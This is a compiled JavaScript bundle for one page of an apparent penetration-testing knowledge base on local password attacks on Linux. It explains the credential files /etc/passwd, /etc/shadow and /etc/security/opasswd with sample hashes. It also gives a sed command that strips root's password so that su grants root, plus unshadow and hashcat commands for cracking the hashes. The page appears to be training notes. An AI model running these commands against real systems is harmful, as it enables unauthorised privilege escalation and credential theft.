"use strict";(self.webpackChunkhkb=self.webpackChunkhkb||[]).push([[201],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>h});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},m=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),d=c(n),m=r,h=d["".concat(l,".").concat(m)]||d[m]||u[m]||o;return n?a.createElement(h,s(s({ref:t},p),{},{components:n})):a.createElement(h,s({ref:t},p))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,s=new Array(o);s[0]=m;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[d]="string"==typeof e?e:r,s[1]=i;for(var c=2;c<o;c++)s[c]=n[c];return a.createElement.apply(null,s)}return a.createElement.apply(null,n)}m.displayName="MDXCreateElement"},9959:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>s,default:()=>u,frontMatter:()=>o,metadata:()=>i,toc:()=>c});var a=n(7462),r=(n(7294),n(3905));const o={},s="Linux",i={unversionedId:"local-password-attacks/linux",id:"local-password-attacks/linux",title:"Linux",description:"There are three important files in Linux that contain credentials:",source:"@site/docs/local-password-attacks/linux.md",sourceDirName:"local-password-attacks",slug:"/local-password-attacks/linux",permalink:"/hkb/local-password-attacks/linux",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Windows",permalink:"/hkb/local-password-attacks/password-hunting/windows"},next:{title:"Windows",permalink:"/hkb/local-password-attacks/windows"}},l={},c=[{value:"File Formats",id:"file-formats",level:2},{value:"<code>/etc/passwd</code>",id:"etcpasswd",level:3},{value:"<code>/etc/shadow</code>",id:"etcshadow",level:3},{value:"<code>/etc/security/opasswd</code>",id:"etcsecurityopasswd",level:3},{value:"Unshadow",id:"unshadow",level:3}],p={toc:c},d="wrapper";function u(e){let{components:t,...n}=e;return(0,r.kt)(d,(0,a.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"linux"},"Linux"),(0,r.kt)("p",null,"There are three important files in Linux that contain credentials:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"/etc/passwd")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"/etc/shadow")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"/etc/security/opasswd"))),(0,r.kt)("h2",{id:"file-formats"},"File Formats"),(0,r.kt)("h3",{id:"etcpasswd"},(0,r.kt)("inlineCode",{parentName:"h3"},"/etc/passwd")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Login name : Password info : UID : GUID : Full name/comments : Home directory : Shell\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-text",metastring:'title="/etc/passwd"',title:'"/etc/passwd"'},"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\n")),(0,r.kt)("admonition",{type:"tip"},(0,r.kt)("p",{parentName:"admonition"},"If you have write access to ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/passwd"),", you can remove the ",(0,r.kt)("inlineCode",{parentName:"p"},"x")," from the password field and login without a password."),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"sed -i 's/root:x:0:0:root/root::0:0:root/' /etc/passwd\nsu # becomes root\n"))),(0,r.kt)("h3",{id:"etcshadow"},(0,r.kt)("inlineCode",{parentName:"h3"},"/etc/shadow")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Username : Encrypted password : Last PW change : Min. PW age : Max. PW age : Warning period : Inactivity period : Expiration date : Unused\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-text",metastring:'title="/etc/shadow"',title:'"/etc/shadow"'},"// highlight-next-line\nroot:$y$j9T$R0RrN9Av7269LVnz./0VY/$711vg7gW3vAuwTZaLPFhBajKipxhMZxEVuedKNRHGOC:19477:0:99999:7:::\ndaemon:*:19477:0:99999:7:::\n...\nsys:*:19477:0:99999:7:::\n// highlight-next-line\ntest:$y$j9T$I880BuoLkcgdFY7yI6D6Q1$ryys0QSUpnpypR7iRt1XEIAPkCamtf3yO2c34g5DA77:19523:0:99999:7:::\n")),(0,r.kt)("h3",{id:"etcsecurityopasswd"},(0,r.kt)("inlineCode",{parentName:"h3"},"/etc/security/opasswd")),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually."),(0,r.kt)("p",{parentName:"blockquote"},"Source: HackTheBox Academy")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-text",metastring:'title="/etc/security/opasswd"',title:'"/etc/security/opasswd"'},"cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1\n")),(0,r.kt)("p",null,"The old passwords are separated by a comma:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0\n$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1\n")),(0,r.kt)("h3",{id:"unshadow"},"Unshadow"),(0,r.kt)("p",null,"The ",(0,r.kt)("inlineCode",{parentName:"p"},"unshadow")," tool combines ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," and ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/shadow")," into a single file."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"unshadow /etc/passwd /etc/shadow > unshadowed.txt\n")),(0,r.kt)("p",null,"Then, you can use ",(0,r.kt)("inlineCode",{parentName:"p"},"hashcat")," to crack the passwords:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt\n")))}u.isMDXComponent=!0}}]);